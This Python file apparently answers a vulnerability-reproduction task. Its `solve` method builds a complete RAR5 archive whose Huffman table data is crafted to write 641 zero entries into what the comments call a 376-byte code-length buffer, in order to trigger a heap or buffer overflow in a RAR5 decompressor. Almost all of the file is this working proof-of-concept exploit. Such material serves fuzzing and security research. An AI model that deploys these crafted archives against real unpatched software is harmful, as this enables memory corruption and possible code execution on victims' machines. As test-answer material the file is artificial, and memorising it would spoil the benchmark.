import zlib

def vint_encode(n: int) -> bytes:
    """Encodes an integer into RAR5's variable-length format."""
    res = bytearray()
    while True:
        b = n & 0x7F
        n >>= 7
        if n == 0:
            res.append(b)
            break
        res.append(b | 0x80)
    return bytes(res)

class BitWriter:
    """Writes bits to a bytearray in LSB-first order."""
    def __init__(self):
        self.data = bytearray()
        self.buffer = 0
        self.count = 0

    def write(self, bits: int, num_bits: int):
        self.buffer |= (bits << self.count)
        self.count += num_bits
        while self.count >= 8:
            self.data.append(self.buffer & 0xFF)
            self.buffer >>= 8
            self.count -= 8

    def get_bytes(self) -> bytes:
        if self.count > 0:
            self.data.append(self.buffer & 0xFF)
        return bytes(self.data)

class Solution:
    def solve(self, src_path: str) -> bytes:
        writer = BitWriter()

        # Data Block Header
        writer.write(1, 1)  # IsBlock
        writer.write(1, 1)  # IsFinalBlock
        writer.write(0, 1)  # UseFilters=0

        # Huffman Table Definition
        writer.write(2, 2)  # 3 tables

        # Meta-table (BitLength table for decoding the main table lengths)
        # Make symbol 18 (long zero run) cheap to encode.
        for i in range(20):
            length = 1 if i == 18 else 0
            writer.write(length, 4)

        # Main Table Lengths, encoded with the meta-table.
        # The buffer for code lengths is 376 bytes.
        
        # Step 1: Fill 375 positions with zeros.
        # Use symbol 18: N = C + 11. We need N=375 zeros.
        # C = 375 - 11 = 364.
        # L (number of bits for C) = 364.bit_length() = 9.
        writer.write(0, 1)       # Code for symbol 18
        writer.write(9, 8)       # L = 9
        writer.write(364, 9)     # C = 364

        # Step 2: Trigger a large overflow.
        # Use symbol 18 again. N = 266 zeros.
        # C = 266 - 11 = 255.
        # L = 255.bit_length() = 8.
        writer.write(0, 1)       # Code for symbol 18
        writer.write(8, 8)       # L = 8
        writer.write(255, 8)     # C = 255
        
        data_block = writer.get_bytes()
        packed_size = len(data_block)

        poc = bytearray(b'\x52\x61\x72\x21\x1a\x07\x01\x00')

        # Archive Header
        arc_header_data = vint_encode(1) + vint_encode(0)
        arc_header_size = vint_encode(len(arc_header_data))
        arc_crc_data = arc_header_size + arc_header_data
        arc_crc = zlib.crc32(arc_crc_data).to_bytes(4, 'little')
        poc.extend(arc_crc + arc_crc_data)

        # File Header
        file_header_data_parts = [
            vint_encode(2),
            vint_encode(0),
            vint_encode(packed_size),
            vint_encode(1),
            vint_encode(0x20),
            b'\x00\x00\x00\x00',
            vint_encode(5),
            vint_encode(2),
            vint_encode(len(b"poc")) + b"poc"
        ]
        file_header_data = b"".join(file_header_data_parts)
        file_header_size = vint_encode(len(file_header_data))
        file_crc_data = file_header_size + file_header_data
        file_crc = zlib.crc32(file_crc_data).to_bytes(4, 'little')
        poc.extend(file_crc + file_crc_data)

        poc.extend(data_block)
        
        # End of Archive Header
        eoa_data = vint_encode(5) + vint_encode(0)
        eoa_size = vint_encode(len(eoa_data))
        eoa_crc_data = eoa_size + eoa_data
        eoa_crc = zlib.crc32(eoa_crc_data).to_bytes(4, 'little')
        poc.extend(eoa_crc + eoa_crc_data)

        return bytes(poc)